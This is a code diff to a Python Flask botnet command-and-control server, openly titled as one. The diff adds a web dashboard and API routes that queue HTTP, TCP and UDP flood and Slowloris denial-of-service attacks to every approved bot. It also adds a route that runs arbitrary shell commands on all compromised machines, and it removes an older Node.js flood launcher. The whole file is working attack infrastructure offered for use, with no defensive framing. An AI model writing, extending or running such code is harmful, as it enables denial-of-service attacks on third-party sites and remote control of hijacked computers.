@@ -1,6 +1,6 @@
 """
-BOTNET C2 SERVER
-================
+BOTNET C2 SERVER - MATCHES CLIENT FEATURES
+==========================================
 Run: python server.py [port]
 Example: python server.py 5000
 
@@ -176,47 +176,21 @@ DASHBOARD_HTML = """
     </div>
 
     <div class="section">
-        <h2>🚀 Launch Node.js Flood (W-FLOOD)</h2>
+        <h2>💥 HTTP Flood Attack</h2>
         <div class="form-group">
             <label>Target URL:</label>
-            <input type="text" id="target" placeholder="https://example.com">
-        </div>
-        <div class="form-group">
-            <label>Duration (seconds):</label>
-            <input type="number" id="duration" value="60">
-        </div>
-        <div class="form-group">
-            <label>Request Rate:</label>
-            <input type="number" id="rate" value="100">
-        </div>
-        <div class="form-group">
-            <label>Threads:</label>
-            <input type="number" id="threads" value="10">
-        </div>
-        <div class="form-group">
-            <label>Proxy File Content (one per line):</label>
-            <textarea id="proxies" placeholder="127.0.0.1:8080
-127.0.0.1:8081"></textarea>
-        </div>
-        <button onclick="launchNodeFlood()">🔥 LAUNCH W-FLOOD TO ALL APPROVED BOTS</button>
-    </div>
-
-    <div class="section">
-        <h2>💥 Advanced HTTP Flood</h2>
-        <div class="form-group">
-            <label>Target URL (-u):</label>
             <input type="text" id="http-target" placeholder="https://example.com">
         </div>
         <div class="form-group">
-            <label>Threads per Bot (-t):</label>
-            <input type="number" id="http-threads" value="50">
+            <label>Threads per Bot:</label>
+            <input type="number" id="http-threads" value="200">
         </div>
         <div class="form-group">
-            <label>Duration in seconds (-d):</label>
+            <label>Duration (seconds):</label>
             <input type="number" id="http-duration" value="60">
         </div>
         <div class="form-group">
-            <label>Method (-m):</label>
+            <label>Method:</label>
             <select id="http-method">
                 <option value="GET">GET</option>
                 <option value="POST">POST</option>
@@ -227,15 +201,71 @@ DASHBOARD_HTML = """
                 <option value="PATCH">PATCH</option>
             </select>
         </div>
-        <div class="form-group">
-            <label>POST Data (optional):</label>
-            <textarea id="http-postdata" placeholder='{"key": "value"} or param1=value1&param2=value2'></textarea>
-        </div>
-        <div class="form-group">
-            <label>Custom Headers (optional, JSON format):</label>
-            <textarea id="http-headers" placeholder='{"User-Agent": "Custom", "X-Custom": "Header"}'></textarea>
-        </div>
         <button onclick="launchHTTPFlood()">🚀 LAUNCH HTTP FLOOD</button>
+    </div>
+
+    <div class="section">
+        <h2>⚡ TCP Flood Attack</h2>
+        <div class="form-group">
+            <label>Target (host:port):</label>
+            <input type="text" id="tcp-target" placeholder="example.com:80">
+        </div>
+        <div class="form-group">
+            <label>Threads per Bot:</label>
+            <input type="number" id="tcp-threads" value="100">
+        </div>
+        <div class="form-group">
+            <label>Duration (seconds):</label>
+            <input type="number" id="tcp-duration" value="60">
+        </div>
+        <button onclick="launchTCPFlood()">🔥 LAUNCH TCP FLOOD</button>
+    </div>
+
+    <div class="section">
+        <h2>💣 UDP Flood Attack</h2>
+        <div class="form-group">
+            <label>Target (host:port):</label>
+            <input type="text" id="udp-target" placeholder="example.com:53">
+        </div>
+        <div class="form-group">
+            <label>Threads per Bot:</label>
+            <input type="number" id="udp-threads" value="100">
+        </div>
+        <div class="form-group">
+            <label>Duration (seconds):</label>
+            <input type="number" id="udp-duration" value="60">
+        </div>
+        <button onclick="launchUDPFlood()">💣 LAUNCH UDP FLOOD</button>
+    </div>
+
+    <div class="section">
+        <h2>🐌 Slowloris Attack</h2>
+        <div class="form-group">
+            <label>Target URL:</label>
+            <input type="text" id="slow-target" placeholder="https://example.com">
+        </div>
+        <div class="form-group">
+            <label>Sockets per Bot:</label>
+            <input type="number" id="slow-sockets" value="300">
+        </div>
+        <div class="form-group">
+            <label>Duration (seconds):</label>
+            <input type="number" id="slow-duration" value="60">
+        </div>
+        <button onclick="launchSlowloris()">🐌 LAUNCH SLOWLORIS</button>
+    </div>
+
+    <div class="section">
+        <h2>🛠️ Bot Commands</h2>
+        <div class="form-group">
+            <label>Shell Command (execute on all bots):</label>
+            <input type="text" id="shell-command" placeholder="whoami">
+        </div>
+        <button onclick="sendShellCommand()">💻 EXECUTE COMMAND</button>
+        <br><br>
+        <button onclick="sendPing()">📡 PING ALL BOTS</button>
+        <button onclick="sendSysInfo()">📊 GET SYSTEM INFO</button>
+        <button onclick="stopAllAttacks()">🛑 STOP ALL ATTACKS</button>
     </div>
 
     <div class="section">
@@ -322,23 +352,22 @@ DASHBOARD_HTML = """
                 });
         }
 
-        function launchNodeFlood() {
-            const target = document.getElementById('target').value;
-            const duration = document.getElementById('duration').value;
-            const rate = document.getElementById('rate').value;
-            const threads = document.getElementById('threads').value;
-            const proxies = document.getElementById('proxies').value;
+        function launchHTTPFlood() {
+            const target = document.getElementById('http-target').value;
+            const duration = document.getElementById('http-duration').value;
+            const threads = document.getElementById('http-threads').value;
+            const method = document.getElementById('http-method').value;
             
             if (!target) {
                 alert('Please enter target URL');
                 return;
             }
             
-            fetch('/api/attack/nodejs', {
+            fetch('/api/attack/http', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    target, duration, rate, threads, proxies
+                body: JSON.stringify({ 
+                    target, duration, threads, method
                 })
             })
             .then(r => r.json())
@@ -348,42 +377,119 @@ DASHBOARD_HTML = """
             });
         }
 
-        function launchHTTPFlood() {
-            const target = document.getElementById('http-target').value;
-            const duration = document.getElementById('http-duration').value;
-            const threads = document.getElementById('http-threads').value;
-            const method = document.getElementById('http-method').value;
-            const postData = document.getElementById('http-postdata').value;
-            const headersText = document.getElementById('http-headers').value;
+        function launchTCPFlood() {
+            const target = document.getElementById('tcp-target').value;
+            const duration = document.getElementById('tcp-duration').value;
+            const threads = document.getElementById('tcp-threads').value;
             
             if (!target) {
-                alert('Please enter target URL');
+                alert('Please enter target');
                 return;
             }
             
-            let headers = {};
-            if (headersText.trim()) {
-                try {
-                    headers = JSON.parse(headersText);
-                } catch(e) {
-                    alert('Invalid JSON in headers field');
-                    return;
-                }
-            }
-            
-            fetch('/api/attack/http', {
+            fetch('/api/attack/tcp', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ 
-                    target, duration, threads, method,
-                    post_data: postData, headers: headers
-                })
+                body: JSON.stringify({ target, duration, threads })
             })
             .then(r => r.json())
             .then(data => {
                 alert(data.message);
                 updateStats();
             });
+        }
+
+        function launchUDPFlood() {
+            const target = document.getElementById('udp-target').value;
+            const duration = document.getElementById('udp-duration').value;
+            const threads = document.getElementById('udp-threads').value;
+            
+            if (!target) {
+                alert('Please enter target');
+                return;
+            }
+            
+            fetch('/api/attack/udp', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ target, duration, threads })
+            })
+            .then(r => r.json())
+            .then(data => {
+                alert(data.message);
+                updateStats();
+            });
+        }
+
+        function launchSlowloris() {
+            const target = document.getElementById('slow-target').value;
+            const duration = document.getElementById('slow-duration').value;
+            const sockets = document.getElementById('slow-sockets').value;
+            
+            if (!target) {
+                alert('Please enter target URL');
+                return;
+            }
+            
+            fetch('/api/attack/slowloris', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ target, duration, sockets })
+            })
+            .then(r => r.json())
+            .then(data => {
+                alert(data.message);
+                updateStats();
+            });
+        }
+
+        function sendShellCommand() {
+            const command = document.getElementById('shell-command').value;
+            
+            if (!command) {
+                alert('Please enter a command');
+                return;
+            }
+            
+            fetch('/api/command/shell', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ command })
+            })
+            .then(r => r.json())
+            .then(data => {
+                alert(data.message);
+                updateStats();
+            });
+        }
+
+        function sendPing() {
+            fetch('/api/command/ping', { method: 'POST' })
+                .then(r => r.json())
+                .then(data => {
+                    alert(data.message);
+                    updateStats();
+                });
+        }
+
+        function sendSysInfo() {
+            fetch('/api/command/sysinfo', { method: 'POST' })
+                .then(r => r.json())
+                .then(data => {
+                    alert(data.message);
+                    updateStats();
+                });
+        }
+
+        function stopAllAttacks() {
+            if(confirm('Stop all active attacks on all bots?')) {
+                fetch('/api/command/stop', { method: 'POST' })
+                    .then(r => r.json())
+                    .then(data => {
+                        alert(data.message);
+                        updateStats();
+                    });
+            }
         }
 
         setInterval(updateStats, 2000);
@@ -522,44 +628,6 @@ def get_stats():
         'logs': attack_logs[-50:]
     })
 
-@app.route('/api/attack/nodejs', methods=['POST'])
-def launch_nodejs_attack():
-    data = request.json
-    proxy_content = data['proxies']
-    args = [data['target'], str(data['duration']), str(data['rate']), str(data['threads']), 'proxies.txt']
-    
-    # Placeholder - paste your W-FLOOD script here
-    script_content = f"""
-const fs = require('fs');
-fs.writeFileSync('proxies.txt', `{proxy_content}`);
-// Your W-FLOOD script here
-console.log('Attack started');
-"""
-    
-    sent_count = 0
-    current_time = time.time()
-    
-    for bot_id, info in approved_bots.items():
-        if current_time - info['last_seen'] < 30:
-            command = {
-                'type': 'nodejs_flood',
-                'script': script_content,
-                'args': args
-            }
-            
-            if bot_id not in commands_queue:
-                commands_queue[bot_id] = []
-            commands_queue[bot_id].append(command)
-            sent_count += 1
-    
-    attack_logs.append({
-        'time': datetime.now().strftime('%H:%M:%S'),
-        'type': 'warning',
-        'message': f'W-FLOOD to {sent_count} bots → {data["target"]}'
-    })
-    
-    return jsonify({'status': 'success', 'message': f'Attack sent to {sent_count} bots'})
-
 @app.route('/api/attack/http', methods=['POST'])
 def launch_http_attack():
     data = request.json
@@ -574,9 +642,7 @@ def launch_http_attack():
                 'target': data['target'],
                 'duration': int(data['duration']),
                 'threads': int(data['threads']),
-                'method': data.get('method', 'GET'),
-                'post_data': data.get('post_data', ''),
-                'headers': data.get('headers', {})
+                'method': data.get('method', 'GET')
             }
             
             if bot_id not in commands_queue:
@@ -587,10 +653,190 @@ def launch_http_attack():
     attack_logs.append({
         'time': datetime.now().strftime('%H:%M:%S'),
         'type': 'warning',
-        'message': f'{data.get("method", "GET")} flood to {sent_count} bots → {data["target"]}'
+        'message': f'HTTP {data.get("method", "GET")} flood to {sent_count} bots → {data["target"]} ({data["threads"]} threads each)'
     })
     
-    return jsonify({'status': 'success', 'message': f'Attack sent to {sent_count} bots'})
+    return jsonify({'status': 'success', 'message': f'HTTP flood sent to {sent_count} bots with {data["threads"]} threads each'})
+
+@app.route('/api/attack/tcp', methods=['POST'])
+def launch_tcp_attack():
+    data = request.json
+    
+    sent_count = 0
+    current_time = time.time()
+    
+    for bot_id, info in approved_bots.items():
+        if current_time - info['last_seen'] < 30:
+            command = {
+                'type': 'tcp_flood',
+                'target': data['target'],
+                'duration': int(data['duration']),
+                'threads': int(data['threads'])
+            }
+            
+            if bot_id not in commands_queue:
+                commands_queue[bot_id] = []
+            commands_queue[bot_id].append(command)
+            sent_count += 1
+    
+    attack_logs.append({
+        'time': datetime.now().strftime('%H:%M:%S'),
+        'type': 'warning',
+        'message': f'TCP flood to {sent_count} bots → {data["target"]} ({data["threads"]} threads each)'
+    })
+    
+    return jsonify({'status': 'success', 'message': f'TCP flood sent to {sent_count} bots with {data["threads"]} threads each'})
+
+@app.route('/api/attack/udp', methods=['POST'])
+def launch_udp_attack():
+    data = request.json
+    
+    sent_count = 0
+    current_time = time.time()
+    
+    for bot_id, info in approved_bots.items():
+        if current_time - info['last_seen'] < 30:
+            command = {
+                'type': 'udp_flood',
+                'target': data['target'],
+                'duration': int(data['duration']),
+                'threads': int(data['threads'])
+            }
+            
+            if bot_id not in commands_queue:
+                commands_queue[bot_id] = []
+            commands_queue[bot_id].append(command)
+            sent_count += 1
+    
+    attack_logs.append({
+        'time': datetime.now().strftime('%H:%M:%S'),
+        'type': 'warning',
+        'message': f'UDP flood to {sent_count} bots → {data["target"]} ({data["threads"]} threads each)'
+    })
+    
+    return jsonify({'status': 'success', 'message': f'UDP flood sent to {sent_count} bots with {data["threads"]} threads each'})
+
+@app.route('/api/attack/slowloris', methods=['POST'])
+def launch_slowloris_attack():
+    data = request.json
+    
+    sent_count = 0
+    current_time = time.time()
+    
+    for bot_id, info in approved_bots.items():
+        if current_time - info['last_seen'] < 30:
+            command = {
+                'type': 'slowloris',
+                'target': data['target'],
+                'duration': int(data['duration']),
+                'sockets': int(data['sockets'])
+            }
+            
+            if bot_id not in commands_queue:
+                commands_queue[bot_id] = []
+            commands_queue[bot_id].append(command)
+            sent_count += 1
+    
+    attack_logs.append({
+        'time': datetime.now().strftime('%H:%M:%S'),
+        'type': 'warning',
+        'message': f'Slowloris to {sent_count} bots → {data["target"]} ({data["sockets"]} sockets each)'
+    })
+    
+    return jsonify({'status': 'success', 'message': f'Slowloris sent to {sent_count} bots with {data["sockets"]} sockets each'})
+
+@app.route('/api/command/shell', methods=['POST'])
+def send_shell_command():
+    data = request.json
+    
+    sent_count = 0
+    current_time = time.time()
+    
+    for bot_id, info in approved_bots.items():
+        if current_time - info['last_seen'] < 30:
+            command = {
+                'type': 'shell',
+                'command': data['command']
+            }
+            
+            if bot_id not in commands_queue:
+                commands_queue[bot_id] = []
+            commands_queue[bot_id].append(command)
+            sent_count += 1
+    
+    attack_logs.append({
+        'time': datetime.now().strftime('%H:%M:%S'),
+        'type': 'warning',
+        'message': f'Shell command to {sent_count} bots: {data["command"]}'
+    })
+    
+    return jsonify({'status': 'success', 'message': f'Command sent to {sent_count} bots'})
+
+@app.route('/api/command/ping', methods=['POST'])
+def send_ping():
+    sent_count = 0
+    current_time = time.time()
+    
+    for bot_id, info in approved_bots.items():
+        if current_time - info['last_seen'] < 30:
+            command = {'type': 'ping'}
+            
+            if bot_id not in commands_queue:
+                commands_queue[bot_id] = []
+            commands_queue[bot_id].append(command)
+            sent_count += 1
+    
+    attack_logs.append({
+        'time': datetime.now().strftime('%H:%M:%S'),
+        'type': 'success',
+        'message': f'Ping sent to {sent_count} bots'
+    })
+    
+    return jsonify({'status': 'success', 'message': f'Ping sent to {sent_count} bots'})
+
+@app.route('/api/command/sysinfo', methods=['POST'])
+def send_sysinfo():
+    sent_count = 0
+    current_time = time.time()
+    
+    for bot_id, info in approved_bots.items():
+        if current_time - info['last_seen'] < 30:
+            command = {'type': 'sysinfo'}
+            
+            if bot_id not in commands_queue:
+                commands_queue[bot_id] = []
+            commands_queue[bot_id].append(command)
+            sent_count += 1
+    
+    attack_logs.append({
+        'time': datetime.now().strftime('%H:%M:%S'),
+        'type': 'success',
+        'message': f'Sysinfo request sent to {sent_count} bots'
+    })
+    
+    return jsonify({'status': 'success', 'message': f'Sysinfo sent to {sent_count} bots'})
+
+@app.route('/api/command/stop', methods=['POST'])
+def send_stop_all():
+    sent_count = 0
+    current_time = time.time()
+    
+    for bot_id, info in approved_bots.items():
+        if current_time - info['last_seen'] < 30:
+            command = {'type': 'stop_all'}
+            
+            if bot_id not in commands_queue:
+                commands_queue[bot_id] = []
+            commands_queue[bot_id].append(command)
+            sent_count += 1
+    
+    attack_logs.append({
+        'time': datetime.now().strftime('%H:%M:%S'),
+        'type': 'error',
+        'message': f'Stop all attacks command sent to {sent_count} bots'
+    })
+    
+    return jsonify({'status': 'success', 'message': f'Stop command sent to {sent_count} bots'})
 
 if __name__ == '__main__':
     import sys
@@ -607,4 +853,3 @@ if __name__ == '__main__':
     print(f"[+] Waiting for bots...\n")
     
     app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
-
